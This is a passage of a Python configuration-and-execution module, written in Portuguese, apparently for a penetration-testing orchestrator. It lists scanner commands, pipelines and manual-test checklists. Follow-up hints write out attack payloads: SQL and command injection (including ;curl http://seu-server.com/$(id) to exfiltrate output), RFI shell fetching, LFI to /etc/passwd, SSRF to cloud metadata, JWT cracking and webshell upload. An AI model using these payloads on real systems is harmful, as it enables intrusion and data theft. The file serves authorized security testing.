            "Filtre: cat urls.txt | grep -E '\\.(js|json|xml|yaml)$'",
            "Arquivos JS podem conter endpoints hardcoded e API keys",
        ],
    },
    "katana": {
        "label": "Katana", "phase": "recon", "category": "osint",
        "desc": "Web crawler com suporte a JavaScript — analisa bundles JS em busca de endpoints",
        "cmd": ["katana", "-u", "{url}", "-depth", "2", "-silent", "-jsonl",
                "-jc", "-kf", "all"],
        "input": "url", "output": "urls",
        "json": True, "binary": "katana", "tags": ["active","crawl"],
        "proxy_support": True,
        "manual_followup": [
            "Endpoints da API descobertos pelo crawl: teste autenticação, rate limiting",
            "Formulários encontrados: teste CSRF, injection, upload de arquivo",
        ],
    },
    "theHarvester": {
        "label": "theHarvester", "phase": "recon", "category": "osint",
        "desc": "Emails e subdomínios via OSINT",
        "cmd": ["theHarvester", "-d", "{domain}", "-b", "crtsh,hackertarget", "-l", "100"],
        "input": "domain", "output": "emails",
        "binary": "theHarvester", "tags": ["passive","osint"],
        "proxy_support": False,
        "manual_followup": [
            "Emails encontrados: verifique em haveibeenpwned.com",
            "Use emails para password spray ou phishing (se autorizado)",
        ],
    },

    # TEST — VULN WEB
    "nikto": {
        "label": "Nikto", "phase": "test", "category": "web_vuln",
        "desc": "Scanner de vulnerabilidades web clássico",
        "cmd": ["nikto", "-h", "{http_url}", "-nointeractive", "-Display", "P"],
        "input": "host", "output": "nikto",
        "binary": "nikto", "tags": ["active","vuln"],
        "proxy_support": True,
        "manual_followup": [
            "Valide manualmente cada finding do Nikto — tem falsos positivos",
            "Métodos HTTP perigosos (PUT/DELETE): tente upload de webshell",
        ],
    },
    "nuclei_cves": {
        "label": "Nuclei CVEs", "phase": "test", "category": "web_vuln",
        "desc": "CVEs críticos, altos e médios via templates",
        "cmd": ["nuclei", "-u", "{http_url}", "-tags", "cve",
                "-severity", "critical,high,medium", "-jsonl", "-silent"],
        "input": "host", "output": "cves",
        "json": True, "binary": "nuclei", "tags": ["active","cve"],
        "proxy_support": True,
        "manual_followup": [
            "Para cada CVE encontrado: busque PoC no exploit-db e github",
            "Versões desatualizadas: verifique também CVEs médios e baixos",
        ],
    },
    "nuclei_misconfig": {
        "label": "Nuclei Misconfig", "phase": "test", "category": "web_vuln",
        "desc": "Misconfigurations, exposições e default logins",
        "cmd": ["nuclei", "-u", "{http_url}", "-tags", "misconfig,exposure,default-login",
                "-jsonl", "-silent"],
        "input": "host", "output": "misconfig",
        "json": True, "binary": "nuclei", "tags": ["active","misconfig"],
        "proxy_support": True,
        "manual_followup": [
            "Default credentials encontradas: tente em outros serviços do alvo",
            "Painéis admin expostos: tente brute force ou credential stuffing",
        ],
    },
    "nuclei_tech": {
        "label": "Nuclei Tech", "phase": "test", "category": "web_vuln",
        "desc": "Templates por tecnologia detectada",
        "cmd": ["nuclei", "-u", "{http_url}", "-tags", "tech",
                "-jsonl", "-silent"],
        "input": "host", "output": "tech_vuln",
        "json": True, "binary": "nuclei", "tags": ["active","tech"],
        "proxy_support": True,
        "manual_followup": [],
    },
    "nuclei_takeover": {
        "label": "Nuclei Takeover", "phase": "test", "category": "web_vuln",
        "desc": "Detecção de subdomain takeover (CNAMEs órfãos)",
        "cmd": ["nuclei", "-u", "{http_url}", "-tags", "takeover",
                "-jsonl", "-silent"],
        "input": "host", "output": "misconfig",
        "json": True, "binary": "nuclei", "tags": ["active","takeover"],
        "proxy_support": True,
        "manual_followup": [
            "Takeover confirmado: registre o recurso órfão (S3/GitHub Pages/Heroku) como PoC",
            "Cruze com a lista de subdomínios mortos do recon",
        ],
    },
    "nuclei_dast": {
        "label": "Nuclei DAST/Fuzz", "phase": "test", "category": "web_vuln",
        "desc": "Fuzzing de parâmetros (XSS/SQLi/SSTI/LFI) via templates fuzzing",
        "cmd": ["nuclei", "-u", "{url}", "-dast", "-jsonl", "-silent"],
        "input": "url", "output": "cves",
        "json": True, "binary": "nuclei", "tags": ["active","dast","fuzz"],
        "proxy_support": True, "timeout": 900,
        "manual_followup": [
            "Findings DAST são pontos de partida — valide no Burp Repeater",
            "Forneça URLs com parâmetros (do gau/katana/arjun) p/ melhor cobertura",
        ],
    },

    # TEST — INJECTION
    "sqlmap": {
        "label": "SQLMap (forms)", "phase": "test", "category": "injection",
        "desc": "SQL injection em formulários da página",
        "cmd": ["sqlmap", "-u", "{url}", "--forms", "--batch",
                "--level=1", "--risk=1", "--random-agent", "--no-logging"],
        "input": "url", "output": "sqli",
        "binary": "sqlmap", "tags": ["active","sqli"],
        "proxy_support": True,
        "manual_followup": [
            "SQLMap não testa todos os pontos: teste manualmente com ' OR 1=1 --",
            "Tente time-based blind: ' AND SLEEP(5) --",
            "Second order injection: injete em perfil, consulte em outro endpoint",
            "NoSQL injection se usar MongoDB: {\"$gt\":\"\"}",
        ],
    },
    "sqlmap_url": {
        "label": "SQLMap (URL)", "phase": "test", "category": "injection",
        "desc": "SQL injection em parâmetros GET",
        "cmd": ["sqlmap", "-u", "{url}", "--batch",
                "--level=1", "--risk=1", "--random-agent", "--no-logging"],
        "input": "url", "output": "sqli",
        "binary": "sqlmap", "tags": ["active","sqli"],
        "proxy_support": True,
        "manual_followup": [
            "Teste parâmetros em POST que o SQLMap pode ter perdido",
            "Headers injetáveis: User-Agent, Referer, X-Forwarded-For",
        ],
    },
    "commix": {
        "label": "Commix", "phase": "test", "category": "injection",
        "desc": "Detecção de command injection",
        "cmd": ["commix", "--url={url}", "--batch", "--level=1"],
        "input": "url", "output": "cmdi",
        "binary": "commix", "tags": ["active","cmdi"],
        "proxy_support": True,
        "manual_followup": [
            "Teste manual: ;id , |whoami , `id`, $(id)",
            "Blind CMDi via time: ;sleep 5;",
            "Out-of-band: ;curl http://seu-server.com/$(id)",
        ],
    },

    # TEST — XSS
    "dalfox": {
        "label": "Dalfox (host)", "phase": "test", "category": "xss",
        "desc": "Scanner XSS no host — detecta e gera PoC",
        "cmd": ["dalfox", "url", "{url}", "--no-color", "--silence",
                "--follow-redirects"],
        "input": "url", "output": "xss",
        "binary": "dalfox", "tags": ["active","xss"],
        "proxy_support": True,
        "manual_followup": [
            "XSS automatizado perde contextos complexos: teste com Burp Repeater",
            "Tente XSS em campos que não são inputs: User-Agent, headers customizados",
            "DOM XSS: inspecione JS no browser, procure innerHTML, document.write",
            "Stored XSS: injete em todos os campos que persistem dados",
            "Blind XSS: use XSSHunter ou canarytokens.org",
        ],
    },
    "dalfox_url": {
        "label": "Dalfox (URL params)", "phase": "test", "category": "xss",
        "desc": "XSS em parâmetros GET específicos",
        "cmd": ["dalfox", "url", "{url}", "--no-color", "--silence"],
        "input": "url", "output": "xss",
        "binary": "dalfox", "tags": ["active","xss"],
        "proxy_support": True,
        "manual_followup": [],
    },

    # TEST — CMS
    "wpscan": {
        "label": "WPScan", "phase": "test", "category": "cms",
        "desc": "Vulnerabilidades WordPress completo",
        "cmd": ["wpscan", "--url", "{http_url}", "--no-banner",
                "--disable-tls-checks", "--enumerate", "p,t,u,vp"],
        "input": "host", "output": "wordpress",
        "binary": "wpscan", "tags": ["active","wordpress"],
        "proxy_support": True,
        "manual_followup": [
            "Usuários encontrados: tente xmlrpc brute force",
            "Plugins desatualizados: pesquise CVE específico do plugin+versão",
            "wp-login.php: tente credential stuffing com dados de breach",
            "REST API exposta: /wp-json/wp/v2/users lista usuários",
        ],
    },
    "feroxbuster": {
        "label": "Feroxbuster", "phase": "test", "category": "fuzzing",
        "desc": "Fuzzing recursivo de diretórios e arquivos",
        "cmd": ["feroxbuster", "-u", "{http_url}", "-q", "--no-state",
                "-x", "php,html,js,txt,bak", "--auto-tune"],
        "input": "host", "output": "dirs",
        "binary": "feroxbuster", "tags": ["active","fuzzing","recursive"],
        "proxy_support": True,
        "manual_followup": [],
    },
    "testssl": {
        "label": "testssl.sh", "phase": "test", "category": "crypto",
        "desc": "Auditoria de TLS/SSL — protocolos fracos, ciphers, cert, vulns",
        "cmd": ["testssl.sh", "--quiet", "--color", "0", "--severity", "LOW", "{host}"],
        "input": "host", "output": "raw",
        "binary": "testssl.sh", "tags": ["active","crypto","tls"],
        "proxy_support": True, "timeout": 600,
        "manual_followup": [
            "TLS 1.0/1.1 ou SSLv3 aceitos? Reporte como config fraca",
            "Cheque Heartbleed, ROBOT, BEAST e cert expirado/autoassinado",
        ],
    },

    # ── RECON — SUBDOMÍNIOS (v6) ──────────────────────────────────────────────
    "tlsx": {
        "label": "TLSx (cert harvest)", "phase": "recon", "category": "subdomains",
        "desc": "Extrai subdomínios via SAN/CN de certificados TLS — encontra hosts que APIs não entregam",
        "cmd": ["tlsx", "-host", "{domain}", "-san", "-cn", "-silent", "-json"],
        "input": "domain", "output": "subdomains",
        "json": True, "binary": "tlsx", "tags": ["passive","tls","fast"],
        "proxy_support": False,
        "manual_followup": [
            "Subdomínios de cert são frequentemente internos/legados — priorize para teste manual",
            "SANs de wildcard (*.exemplo.com) indicam infra compartilhada — verifique cada host",
        ],
    },
    "amass_passive": {
        "label": "Amass (passive OSINT)", "phase": "recon", "category": "subdomains",
        "desc": "OSINT passivo profundo — CertDB, PassiveTotal, SecurityTrails, Shodan",
        "cmd": ["amass", "enum", "-passive", "-d", "{domain}", "-timeout", "5"],
        "input": "domain", "output": "subdomains",
        "binary": "amass", "tags": ["passive","osint"],
        "proxy_support": False,
        "manual_followup": [
            "Combine com dnsx para validar quais subdomínios estão ativos",
            "amass enum -active -d {domain} para enumeração ativa com brute force",
        ],
    },
    "findomain": {
        "label": "Findomain", "phase": "recon", "category": "subdomains",
        "desc": "Subdomain finder rápido via Cert.sh, AnubisDB, Threatminer, VirusTotal",
        "cmd": ["findomain", "-t", "{domain}", "-q"],
        "input": "domain", "output": "subdomains",
        "binary": "findomain", "tags": ["passive","fast"],
        "proxy_support": False,
        "manual_followup": [],
    },

    # ── RECON — PORTAS (v6) ───────────────────────────────────────────────────
    "masscan": {
        "label": "Masscan (full range)", "phase": "recon", "category": "ports",
        "desc": "Port scanner ultra-rápido — varre 65535 portas em segundos (requer root)",
        "cmd": ["masscan", "{host}", "-p0-65535", "--rate=1000", "--open-only", "-oG", "-"],
        "input": "host", "output": "ports",
        "binary": "masscan", "tags": ["active","ports","fast"],
        "proxy_support": False,
        "manual_followup": [
            "Portas descobertas: rode nmap -sV -sC em cada uma para identificar serviços",
            "masscan requer root — se falhar com permissão, use naabu ou nmap_full",
            "Reduza --rate para redes instáveis ou para menos ruído (--rate=100)",
        ],
    },
    "rustscan": {
        "label": "RustScan", "phase": "recon", "category": "ports",
        "desc": "Port scanner em Rust — descoberta ultra-rápida, pipeline direto para nmap",
        "cmd": ["rustscan", "-a", "{host}", "--ulimit", "5000", "--", "-sV", "-sC"],
        "input": "host", "output": "ports",
        "binary": "rustscan", "tags": ["active","ports","fast"],
        "proxy_support": False,
        "manual_followup": [
            "Ajuste --ulimit se receber erros de 'too many open files'",
        ],
    },

    # ── RECON — CLOUD / SHODAN (v6) ───────────────────────────────────────────
    "uncover": {
        "label": "Uncover (Shodan/Censys)", "phase": "recon", "category": "osint",
        "desc": "Agrega Shodan, Censys, Fofa e Hunter.io — descobre ativos expostos com contexto",
        "cmd": ["uncover", "-q", "{domain}", "-silent", "-json"],
        "input": "domain", "output": "live_hosts",
        "json": True, "binary": "uncover", "tags": ["passive","osint"],
        "proxy_support": False,
        "manual_followup": [
            "Ativos Shodan: infra legada sem patch — alta prioridade de teste",
            "Configure API keys: ~/.config/uncover/provider-config.yaml",
            "Busca avançada: uncover -q 'ssl:example.com' ou 'http.title:\"Login\"'",
        ],
    },
    "cloud_enum": {
        "label": "Cloud Enum (S3/GCS/Azure)", "phase": "recon", "category": "osint",
        "desc": "Enumera buckets S3, GCS e Azure Blob misconfigured pelo nome/domínio da empresa",
        "cmd": ["cloud_enum", "-k", "{domain}", "--quickscan"],
        "input": "domain", "output": "raw",
        "binary": "cloud_enum", "tags": ["passive","cloud"],
        "proxy_support": False,
        "manual_followup": [
            "Bucket S3 público: aws s3 ls s3://BUCKET --no-sign-request",
            "Bucket gravável: aws s3 cp test.txt s3://BUCKET --no-sign-request",
            "GCS: curl https://storage.googleapis.com/BUCKET",
            "Azure: curl https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list",
        ],
    },

    # ── RECON — SECRETS (v6) ──────────────────────────────────────────────────
    "nuclei_secrets": {
        "label": "Nuclei Secrets/Tokens", "phase": "recon", "category": "osint",
        "desc": "Detecta API keys, tokens e credenciais expostas em respostas HTTP e JS",
        "cmd": ["nuclei", "-u", "{http_url}", "-tags", "exposure,token,secret,api",
                "-severity", "critical,high,medium", "-jsonl", "-silent"],
        "input": "host", "output": "cves",
        "json": True, "binary": "nuclei", "tags": ["passive","secrets"],
        "proxy_support": True,
        "manual_followup": [
            "Tokens AWS: 'aws sts get-caller-identity' para verificar permissões",
            "API keys expostas: identifique o serviço e reporte como crítico — revogação imediata",
            "Tokens JWT em respostas: decode em jwt.io e analise claims",
        ],
    },

    # ── TEST — OOB / BLIND VULN (v6) ─────────────────────────────────────────
    "interactsh": {
        "label": "Interactsh (OOB setup)", "phase": "test", "category": "web_vuln",
        "desc": "Inicia sessão OOB (oast.site) para detectar blind SSRF/XSS/XXE/RCE",
        "cmd": ["interactsh-client", "-server", "oast.site", "-n", "1", "-json"],
        "input": "host", "output": "raw",
        "binary": "interactsh-client", "tags": ["active","oob"],
        "proxy_support": False,
        "timeout": 60,
        "manual_followup": [
            "Use o URL OOB gerado como payload em: dalfox --blind URL, nuclei -iserver URL",
            "SQLi OOB (MySQL): ' AND LOAD_FILE('//OOB_URL/test')-- -",
            "SSRF: ?url=http://OOB_URL&redirect=http://OOB_URL",
            "XXE: <!ENTITY xxe SYSTEM 'http://OOB_URL/xxe'>",
            "Blind XSS: <script src='http://OOB_URL/x.js'></script>",
        ],
    },

    # ── TEST — CVE INTELLIGENCE (v6) ──────────────────────────────────────────
    "cvemap": {
        "label": "CVEMap (CVE search)", "phase": "test", "category": "web_vuln",
        "desc": "Busca CVEs com PoC/exploit disponível — use após fingerprint para consultar por produto",
        "cmd": ["cvemap", "-q", "{domain}", "-severity", "critical,high",
                "-json", "-limit", "20"],
        "input": "domain", "output": "cves",
        "binary": "cvemap", "tags": ["passive","cve"],
        "proxy_support": False,
        "manual_followup": [
            "CVEs com PoC: busque exploit em https://github.com/search?q=CVE-XXXX-XXXX",
            "Confirme a versão real do produto antes de reportar o CVE",
            "cvemap -product 'wordpress' -version '6.4' para busca por produto específico",
        ],
    },

    # ── TEST — WEB MISC (v6) ──────────────────────────────────────────────────
    "nomore403": {
        "label": "nomore403 (bypass)", "phase": "test", "category": "web_vuln",
        "desc": "Testa 20+ técnicas de bypass em recursos 403 Forbidden",
        "cmd": ["nomore403", "-u", "{http_url}"],
        "input": "host", "output": "raw",
        "binary": "nomore403", "tags": ["active","bypass"],
        "proxy_support": True,
        "manual_followup": [
            "200 via bypass: confirme conteúdo real — pode ser inconsistência de cache/proxy",
            "Técnicas efetivas: X-Original-URL, X-Rewrite-URL, //path, /./path, path%20",
            "Combine com feroxbuster para bypass recursivo em múltiplos endpoints",
        ],
    },
    "corsy": {
        "label": "Corsy (CORS scan)", "phase": "test", "category": "web_vuln",
        "desc": "Detecta CORS misconfiguration — origin reflection, wildcard + credenciais",
        "cmd": ["corsy", "-u", "{http_url}", "-q"],
        "input": "host", "output": "raw",
        "binary": "corsy", "tags": ["active","cors"],
        "proxy_support": True,
        "manual_followup": [
            "CORS crítico: Access-Control-Allow-Origin refletido + Allow-Credentials: true",
            "PoC: fetch('https://alvo.com/api', {credentials:'include'}) de origin malicioso",
            "Teste todos os endpoints de API descobertos, não apenas o root",
        ],
    },
}

# ── Checklist de testes manuais por categoria ─────────────────────────────────
# Aparece na aba "Cobertura" após o scan terminar

MANUAL_CHECKLIST = {
    "auth": {
        "label": "Autenticação & Sessão",
        "icon": "🔐",
        "checks": [
            "Brute force no login — rate limiting está ativo?",
            "Account lockout após N tentativas?",
            "Senhas fracas aceitas? (admin/admin, 123456)",
            "Forget password: oracle de usuários válidos?",
            "Tokens de sessão são aleatórios? (analise no Burp)",
            "Cookie session sem HttpOnly/Secure?",
            "JWT: alg=none, weak secret, iss manipulation",
            "OAuth: redirect_uri manipulation, state CSRF",
            "Multi-factor: pode ser bypassado?",
            "Password reset link expira? Pode ser reutilizado?",
        ]
    },
    "authz": {
        "label": "Autorização & IDOR",
        "icon": "🚪",
        "checks": [
            "IDOR: mude IDs numéricos nos endpoints (/user/1 → /user/2)",
            "IDOR em GUIDs: enumere outros objetos",
            "Horizontal privilege: acesse recursos de outro usuário",
            "Vertical privilege: acesse endpoint de admin como user",
            "API versão antiga sem auth: /api/v1/ vs /api/v2/",
            "Mass assignment: envie campos extras no JSON (role, isAdmin)",
            "Forced browsing: acesse endpoints diretamente sem navegar",
            "Parâmetro de conta: ?account_id= ou ?user= manipulável?",
        ]
    },
    "injection": {
        "label": "Injection (além do automático)",
        "icon": "💉",
        "checks": [
            "SSTI: {{7*7}} em todos os campos de texto",
            "SSTI: ${7*7}, #{7*7}, <%= 7*7 %>",
            "XXE: envie XML com entidade externa em uploads",
            "SSRF: parâmetros ?url=, ?redirect=, ?fetch=, ?img=",
            "SSRF: tente http://169.254.169.254 (AWS metadata)",
            "Header injection: CR/LF em User-Agent, X-Forwarded-For",
            "LDAP injection: *)(uid=* em campos de login",
            "XPath injection: ' or '1'='1 em XML queries",
            "Deserialization: magic bytes em cookies base64",
        ]
    },
    "file": {
        "label": "Upload & File Inclusion",
        "icon": "📁",
        "checks": [
            "Upload de .php renomeado como .php.jpg — executável?",
            "Upload de SVG com XSS embutido",
            "Upload de arquivo com nome ../../../etc/passwd",
            "Magic bytes bypass: arquivo PHP com bytes GIF89a no header",
            "LFI: ?page=../../../../etc/passwd",
            "LFI com null byte: ?page=../etc/passwd%00.php",
            "LFI via PHP wrappers: php://filter/convert.base64-encode/resource=index",
            "RFI: ?page=http://seu-server.com/shell.txt",
            "Log poisoning via LFI + User-Agent",
        ]
    },
    "business": {
        "label": "Lógica de Negócio",
        "icon": "🧠",
        "checks": [
            "Preços negativos ou zero em compras",
            "Desconto de 100% ou quantidade negativa",
            "Race condition: duas compras simultâneas com um saldo",
            "Pular etapas do fluxo (checkout → confirmação direta)",
            "Manipular parâmetros ocultos no fluxo de pagamento",
            "Coupon de desconto reutilizável ou empilhável",
            "2FA: pode ser bypassado trocando diretamente para /dashboard?",
            "Email confirmation link: funciona para qualquer email?",
        ]
    },
    "headers": {
        "label": "Headers & Configuração",
        "icon": "📋",
        "checks": [
            "Content-Security-Policy ausente ou fraca?",
            "X-Frame-Options ausente → Clickjacking",
            "CORS: Access-Control-Allow-Origin: * com credenciais?",
            "CORS: origin refletido sem validação?",
            "HSTS ausente em site HTTPS",
            "X-Content-Type-Options ausente → MIME sniffing",
            "Referrer-Policy expõe tokens em URL?",
            "Versão de servidor exposta no header Server:",
            "OPTIONS: lista métodos perigosos (PUT, DELETE, TRACE)?",
        ]
    },
    "crypto": {
        "label": "Criptografia & Transporte",
        "icon": "🔒",
        "checks": [
            "SSL/TLS: SSLv3, TLS 1.0/1.1 aceitos? (use testssl.sh)",
            "Certificado autoassinado ou expirado?",
            "Mixed content: recursos HTTP em página HTTPS?",
            "Senhas em plain text em requests ou respostas?",
            "Tokens em URLs (aparecem em logs do servidor)?",
            "Dados sensíveis em cache: Cache-Control: no-store?",
        ]
    },

    # ── v6 — Novas categorias ──────────────────────────────────────────────────

    "cloud": {
        "label": "Cloud & Infrastructure",
        "icon": "☁",
        "checks": [
            "Bucket S3 com mesmo nome do domínio é público? (aws s3 ls s3://DOMAIN --no-sign-request)",
            "Google Cloud Storage: curl https://storage.googleapis.com/DOMAIN",
            "Azure Blob: curl 'https://DOMAIN.blob.core.windows.net/CONTAINER?restype=container&comp=list'",
            "Bucket permite escrita anônima? (aws s3 cp test.txt s3://DOMAIN --no-sign-request)",
            "Metadata server via SSRF: http://169.254.169.254/latest/meta-data/ (AWS)",
            "Metadata GCP: http://metadata.google.internal/computeMetadata/v1/",
            "Metadata Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Kubernetes API exposto? /api/v1/pods, /metrics, /healthz",
            "Docker API exposto em porta 2375? GET /containers/json",
            "Secrets em .env, docker-compose.yml, .git/config expostos via ffuf?",
        ]
    },
    "jwt_oauth": {
        "label": "JWT & OAuth",
        "icon": "🔑",
        "checks": [
            "JWT com alg=none aceito? (remova a assinatura e troque alg para none)",
            "JWT com secret fraco? (crack com hashcat: hashcat -a 0 -m 16500 token wordlist.txt)",
            "JWT kid header faz path traversal? (kid: ../../dev/null)",
            "JWT kid faz SQL injection? (kid: ' UNION SELECT 'secret'-- -)",
            "JWT iss/sub manipulation — troque para outro usuário",
            "OAuth redirect_uri aceita domínios arbitrários?",
            "OAuth state CSRF — remova o state e teste se fluxo continua",
            "OAuth token leak via Referer header (página externa acessada após auth)",
            "OAuth implicit flow — token exposto na URL do fragmento (#access_token=...)",
            "Password reset token expira? Pode ser reutilizado após uso?",
            "Refresh token válido indefinidamente? Não revogado no logout?",
        ]
    },
    "api_security": {
        "label": "API Security",
        "icon": "🔌",
        "checks": [
            "API versão antiga sem autenticação: /api/v1/ vs /api/v2/",
            "GraphQL introspection habilitada em produção? (query: {__schema{types{name}}})",
            "GraphQL batching permite brute force? (array de mutations de login)",
            "GraphQL IDOR: busque campos id/userId em queries e manipule",
            "Rate limiting ausente em endpoints de autenticação?",
            "Mass assignment em PUT/PATCH: envie campos extras (role, isAdmin, verified)",
            "BOLA/IDOR em IDs de recursos: GET /api/orders/1234 → /api/orders/1235",
            "Endpoint retorna dados excessivos? Campos sensíveis não utilizados pelo cliente?",
            "HTTP verb tampering: recurso que aceita GET/POST — tente PUT/DELETE",
            "API key exposta em resposta JSON, header ou código JS?",
            "CORS em endpoint de API aceita origin arbitrário + credentials?",
            "Swagger/OpenAPI exposto em /api-docs, /swagger.json, /openapi.yaml?",
        ]
    },
}

# ── Pipelines ──────────────────────────────────────────────────────────────────
PIPELINES = {
    "ctf_box": {
        "label": "CTF / HTB Box", "icon": "⚡", "color": "#ffb86c",
        "desc": "Workflow completo para máquinas de CTF",
        "stages": [
            {"id":"s1","name":"Port & Service Discovery","phase":"recon",
             "tools":["nmap_quick","naabu"]},
            {"id":"s2","name":"Web Fingerprint","phase":"recon",
             "tools":["httpx","whatweb","wafw00f","curl_headers","gowitness"]},
            {"id":"s3","name":"Dir & Content Fuzzing","phase":"recon",
             "tools":["ffuf_dirs","ffuf_ext","gobuster_dir"]},
            {"id":"s4","name":"Vuln Testing","phase":"test",
             "tools":["nmap_vuln","nikto","nuclei_cves","nuclei_misconfig","sqlmap","dalfox"]},
        ]
    },
    "web_pentest": {
        "label": "Web App Pentest", "icon": "🌐", "color": "#00cfff",
        "desc": "Pentest completo de aplicação web",
        "stages": [
            {"id":"s1","name":"Fingerprint & Headers","phase":"recon",
             "tools":["httpx","whatweb","wafw00f","curl_headers","gowitness"]},
            {"id":"s2","name":"Content Discovery","phase":"recon",
             "tools":["ffuf_dirs","ffuf_ext","gobuster_dir","gobuster_vhost","katana","arjun"]},
            {"id":"s3","name":"OSINT & History","phase":"recon",
             "tools":["waybackurls","gau"]},
            {"id":"s4","name":"Vulnerability Testing","phase":"test",
             "tools":["nikto","nuclei_cves","nuclei_misconfig","nuclei_tech","nuclei_takeover",
                      "testssl","sqlmap","dalfox","commix"]},
        ]
    },
    "full_pentest": {
        "label": "Full Pentest", "icon": "🎯", "color": "#ff5555",
        "desc": "Recon -> Scan -> Verificacao manual (eleva findings a confirmed via PoC)",
        "verify_layer": True,
        "stages": [
            {"id":"s1","name":"Fingerprint & Headers","phase":"recon",
             "tools":["httpx","whatweb","wafw00f","curl_headers","gowitness"]},
            {"id":"s2","name":"Port & Service Discovery","phase":"recon",
             "tools":["nmap_quick","naabu"]},
            {"id":"s3","name":"Content & History","phase":"recon",
             "tools":["ffuf_dirs","ffuf_ext","katana","arjun","waybackurls","gau"]},
            {"id":"s4","name":"Vulnerability Scan","phase":"test",
             "tools":["nikto","nuclei_cves","nuclei_misconfig","nuclei_tech",
                      "nuclei_takeover","testssl","sqlmap","dalfox","commix","corsy"]},
        ]
    },
    "subdomain_recon": {
        "label": "Subdomain Recon", "icon": "🔭", "color": "#bd93f9",
        "desc": "Mapeamento completo de superfície de ataque",
        "stages": [
            {"id":"s1","name":"DNS & WHOIS","phase":"recon",
             "tools":["whois","dnsrecon"]},
            {"id":"s2","name":"Subdomain Enum","phase":"recon",
             "tools":["subfinder","assetfinder","dnsx"]},
            {"id":"s3","name":"Live Host Probe","phase":"recon",
             "tools":["httpx","whatweb","wafw00f","gowitness"]},
            {"id":"s4","name":"Surface Testing","phase":"test",
             "tools":["nuclei_cves","nuclei_misconfig","nuclei_takeover"]},
        ]
    },
    "bug_bounty": {
        "label": "Bug Bounty", "icon": "💰", "color": "#50fa7b",
        "desc": "Máxima cobertura para bug bounty",
        "stages": [
            {"id":"s1","name":"Asset Discovery","phase":"recon",
             "tools":["subfinder","assetfinder","tlsx","dnsx"]},
            {"id":"s2","name":"Fingerprint","phase":"recon",
             "tools":["httpx","whatweb","wafw00f","curl_headers","gowitness"]},
            {"id":"s3","name":"Content & History","phase":"recon",
             "tools":["ffuf_dirs","ffuf_ext","waybackurls","gau","katana","arjun","nuclei_secrets"]},
            {"id":"s4","name":"Vuln Testing","phase":"test",
             "tools":["nuclei_misconfig","nuclei_cves","nuclei_takeover","nuclei_dast",
                      "nomore403","corsy","sqlmap","dalfox","commix"]},
        ]
    },

    # ── PIPELINES v6 ──────────────────────────────────────────────────────────

    "cloud_recon": {
        "label": "Cloud Attack Surface", "icon": "☁", "color": "#ff79c6",
        "desc": "Mapeamento de superfície de ataque em cloud — S3, GCS, Azure, Shodan",
        "stages": [
            {"id":"s1","name":"Asset & Cert Discovery","phase":"recon",
             "tools":["subfinder","assetfinder","tlsx","dnsx"]},
            {"id":"s2","name":"Live Probe + Shodan","phase":"recon",
             "tools":["httpx","whatweb","uncover"]},
            {"id":"s3","name":"Cloud Bucket Enum","phase":"recon",
             "tools":["cloud_enum"]},
            {"id":"s4","name":"Misconfig & Takeover","phase":"test",
             "tools":["nuclei_misconfig","nuclei_takeover","nuclei_secrets","cvemap"]},
        ]
    },
    "api_pentest": {
        "label": "API Pentest", "icon": "🔌", "color": "#ff6e6e",
        "desc": "Pentest focado em APIs REST/GraphQL — discovery, param fuzzing, injection",
        "stages": [
            {"id":"s1","name":"API Discovery","phase":"recon",
             "tools":["httpx","katana","arjun","waybackurls","gau"]},
            {"id":"s2","name":"Fingerprint & Secrets","phase":"recon",
             "tools":["whatweb","curl_headers","nuclei_secrets"]},
            {"id":"s3","name":"CORS & Misconfig","phase":"test",
             "tools":["corsy","nuclei_misconfig","nuclei_tech","nomore403"]},
            {"id":"s4","name":"Injection","phase":"test",
             "tools":["nuclei_dast","dalfox_url","sqlmap_url","commix"]},
        ]
    },
    "stealth_recon": {
        "label": "Stealth Recon", "icon": "👁", "color": "#8be9fd",
        "desc": "Reconhecimento passivo — mínimo ruído, zero bruteforce ativo",
        "stages": [
            {"id":"s1","name":"Passive DNS & Certs","phase":"recon",
             "tools":["subfinder","assetfinder","tlsx","whois"]},
            {"id":"s2","name":"OSINT & History","phase":"recon",
             "tools":["waybackurls","gau","theHarvester","uncover"]},
            {"id":"s3","name":"Passive Probe","phase":"recon",
             "tools":["httpx","curl_headers"]},
            {"id":"s4","name":"Passive Vuln Check","phase":"test",
             "tools":["nuclei_secrets","nuclei_takeover","cvemap"]},
        ]
    },
}

# ══════════════════════════════════════════════════════════════════════════════
# EXECUÇÃO
# ══════════════════════════════════════════════════════════════════════════════

active_scans = {}

def check_binary(binary):
    return bool(shutil.which(binary))

def build_cmd(tool_key, raw_target, proxy=None, request_context=None):
    tool = TOOLS[tool_key]
    template = tool['cmd'][:]
    input_type = tool['input']

    if input_type == 'domain':
        t = to_domain(raw_target)
        if not t: return None, f"'{raw_target[:60]}' não é domínio válido"
        r = {'{domain}':t, '{host}':t, '{http_url}':f'http://{t}', '{url}':f'http://{t}'}
    elif input_type == 'host':
        t = to_host(raw_target)
        if not t: return None, f"'{raw_target[:60]}' não é host válido"
        r = {'{host}':t, '{domain}':t, '{http_url}':f'http://{t}', '{url}':f'http://{t}'}
    elif input_type == 'url':
        t = to_url(raw_target) or to_http_url(raw_target)
        if not t: return None, f"'{raw_target[:60]}' não é URL válida"
        r = {'{url}':t, '{http_url}':t, '{host}':to_host(t) or t, '{domain}':to_domain(t) or t}
    else:
        t = raw_target.strip()
        r = {'{domain}':t, '{host}':t, '{http_url}':f'http://{t}', '{url}':t}

    cmd = []
    for part in template:
        resolved = part
        for k, v in r.items():
            resolved = resolved.replace(k, v)
        cmd.append(resolved)

    # Verifica wordlist
    for part in cmd:
        if ('wordlists' in part or 'seclists' in part) and not Path(part).exists():
            return None, f"Wordlist não encontrada: {part}"

    # Injeta proxy
    try:
        cmd = inject_proxy(cmd, tool_key, proxy)
    except ValueError as e:
        return None, str(e)

    if request_context:
        if tool_key not in ('sqlmap_url', 'dalfox_url'):
            return None, 'Contexto de formulário não suportado por esta ferramenta'
        if request_context.get('data') is not None:
            cmd += ['--data', request_context['data']]
        if request_context.get('cookie'):
            cmd += ['--cookie', request_context['cookie']]
        params = request_context.get('parameters', [])
        if params:
            if tool_key == 'dalfox_url':
                for param in dict.fromkeys(params):
                    cmd += ['-p', param]
            else:
                cmd += ['-p', ','.join(dict.fromkeys(params))]
        if tool_key == 'sqlmap_url':
            cmd += ['--ignore-redirects', '--timeout=10', '--retries=1']
            if request_context.get('tokens'):
                cmd += ['--csrf-token', request_context['tokens'][0],
                        '--csrf-url', request_context['page']]

    return cmd, t

